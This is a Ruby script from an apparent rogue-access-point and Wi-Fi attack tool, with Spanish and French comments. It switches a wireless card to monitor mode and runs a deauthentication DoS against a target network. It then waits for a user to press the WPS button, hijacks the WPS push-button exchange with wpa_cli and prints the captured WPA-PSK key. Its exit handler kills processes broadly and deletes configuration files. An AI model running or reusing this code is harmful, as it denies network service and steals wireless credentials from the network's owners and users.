#!/usr/bin/env ruby


require 'gtk2'
require 'open3'
require 'highline/import'


trap "SIGINT" do
  puts "\e[1;94m[*] Exit... limpieza de ficheros...\e[0m"
sleep 3
Dir.chdir '/tmp/hostbase-1.4ES'
sleep 1
if File.exist?("cartef.txt")
Dir.chdir '/tmp'
sleep 1
`rm -rf hostapd.psk`
`killall hostapd`
`rm -rf *.conf`
`killall dnsspoof`
`killall xterm`
`killall dhcpd`
`killall wash`
`killall wpa_supplicant`
`killall bash`
Dir.chdir '/tmp/hostbase-1.4ES'
sleep 1
`rm -rf *.pid`
File.open("cartef.txt").readlines.each do |cartef|
   puts cartef
$cartef = cartef.chomp
File.open("cartebis.txt").readlines.each do |cartebis|
   puts cartebis
$cartebis = cartebis.chomp
puts "Vuelta a la normal de las tarjetas wifi..."
`ifconfig #{$cartef} down`
`iw dev #{$cartef} set type managed`
sleep 2
`ip link set #{$cartef} up`
         sleep 2
`ifconfig #{$cartebis} down`
`iw dev #{$cartebis} set type managed`
sleep 2
`ip link set #{$cartebis} up`
         sleep 2         
`systemctl enable NetworkManager.service`
sleep 2
`systemctl start NetworkManager.service`
sleep 4
`rm -rf /var/lib/dhcp/dhcpd.leases`
`rm -rf *.txt`
puts "Bye..."
exit
end
end
else
`rm -rf *.pid`
`killall airbase-ng`
`killall dnsspoof`
`killall xterm`
`killall dhcpd`
`killall wash`
`killall wpa_supplicant`
Dir.chdir '/tmp/hostbase-1.4ES'
sleep 1
`rm -rf *.pid`
`rm -rf *.txt`
puts "Vuelta a la normal de las tarjetas wifi..."
`ifconfig wlan5 down`
`ip link set wlan5 name wlan1`
`ip link set wlan1 down`
sleep 1
`iw dev wlan1 set type managed`
sleep 2
`ip link set wlan1 up`
         sleep 5
`systemctl enable NetworkManager.service`
sleep 4
`systemctl start NetworkManager.service`
sleep 5
`rm -rf /var/lib/dhcp/dhcpd.leases`
`killall wash`
`killall bash`
puts "Bye..."
exit
end
end


class Setup
def self.interface
load 'accessdos.rb'
puts "Iniciando la segunda tarjeta wifi en modo monitor..."
system "ip link set #{$cartedos} down"
`iw dev #{$cartedos} set type monitor`
sleep 5
`ip link set #{$cartedos} up`
Setup.activeDos
end

def self.activeDos
puts "Iniciando la DoS..."
dos = Thread.new { `bash rundos.sh` }  # ON balance la dos dansun thread qui s'éxécute en arrière plan (c'est plus propre je trouve).
Setup.victimeAttente  # on appelle la fonction dont on a besoin
sleep(5000000)  # Correspond a la durée de vie du thread dos, on peut ici définir une tache a faire pendant X temps et elle s'arretera a la fin de ce temps, dans notre cas  on met un temps très long pour maintenir l'attaque.
end


def self.victimeAttente      
puts "Iniciando wash..."
wash = Thread.new { `bash wash.sh` }
Setup.wpsPush # on appelle la fonction dont on a besoin
sleep(5000000)        
       # Lancement de hostapd_cli a rajouter ici
       # Appel du script rogueinit et/ou de la méthode correspondante
       # Voir nohup ou xterm -e
   end
   
   
   def self.wpsPush 
Dir.chdir '/tmp/hostbase-1.4ES'
sleep 2
puts "Esperamos que alguien se conecta... ctrl+c para salir..."
until File.read('wash.txt').include?('wps_selected_registrar')
sleep 1
end
puts "\e[1;32m[[*] Un uasario se ha conectado y el boton WPS ha sido apoyado...\e[0m"
puts "\e[1;32m[*] Paramos la DoS...\e[0m"
Process.kill 15, File.read('/tmp/terminal.pid').to_i
Process.kill 15, File.read('/tmp/hostbase-1.4ES/wash.pid').to_i
`killall wash`
if File.exist?("terminalfrequence.pid")
sleep 1
Process.kill 15, File.read('/tmp/hostbase-1.4ES/terminalfrequence.pid').to_i
`killall wash`
else
nil
end
puts "Iniciando wpa_cli..."
load 'historique.rb'
`killall wash`
`killall xterm`
`killall sleep`
`killall mdk3`
`ip link set #{$cartedos} down`
`iw dev #{$cartedos} set type managed`
sleep 3
`rfkill unblock all`
`ip link set #{$cartedos} up`
sleep 6
       puts "\e[1;32m[*] Esperamos la clave wifi...\e[0m"
`killall wpa_supplicant`
Dir.chdir '/etc'    
sleep 1
`rm -rf wpa_supplicant.conf`
`cp -R /tmp/hostbase-1.4ES/wpa_supplicant.conf /etc/`
sleep 1;
`sudo wpa_supplicant -B -Dnl80211 -i#{$cartedos} -c/etc/wpa_supplicant.conf`
sleep 2
`killall wash`
wpacli = Thread.new do
  while true
    system "xterm -e wpa_cli wps_pbc #{$apmac}" # A CHANGER PAR $BSSID  # On lance wpa_cli et wps_pbc en tant que thread
    sleep(20) # Temps avant la relance de la commande
  end
end
Setup.wpsGrab  # on appelle la fonction dont on a besoin A COMPLETER APRÈS WPA_CLI mettre le trap ici ?
 sleep(5000000)
end

def self.wpsGrab
Dir.chdir '/etc'
sleep 2
until File.read('wpa_supplicant.conf').include?('WPA')
sleep 1
end
puts "\e[1;32m[*] Clave wifi WPA-PSK:\e[0m"
File.open("wpa_supplicant.conf").readlines.each do |wpa|
   puts wpa
   `killall wpa_supplicant`
end
end
end
